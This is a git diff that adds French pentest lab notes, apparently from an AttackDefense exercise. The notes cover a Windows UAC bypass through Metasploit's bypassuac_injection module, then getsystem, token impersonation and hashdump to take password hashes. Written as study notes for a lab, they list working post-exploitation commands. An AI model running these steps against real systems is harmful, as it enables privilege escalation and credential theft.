@@ -114,3 +114,12 @@ Relancer l'exploit avec rejetto (sinon Incognito ne démarrera pas avec cause de
 Nous avons le compte *Administrator* et le compte *local service* en Delegation. Nous allons migrer le compte *Administrator* en Impersonate : `impersonate_token "ATTACKDEFENSE\Administrator"`  
 `getuid`, `pgrep explorer`, `migrate <PID>`, `getprivs` on voit qu'on a plein de privilèges.  
 
+
+### UAC Bypass: Memory Injection  
+Migrer vers un prcessus x64 (explorer.exe). `getsysinfo` permet de vérifier.  
+``shell``  
+``net localgroup administrators``  
+`use exploit/windows/local/bypassuac_injection`, rentrer la sessions actuelle (x64), générer un payload en x64, et TARGET en x64.  
+``getsystem`` pour élever au priv system.  
+`hashdump` pour récupérer les hash ( ou migrer vers lsass.exe avant)  
+
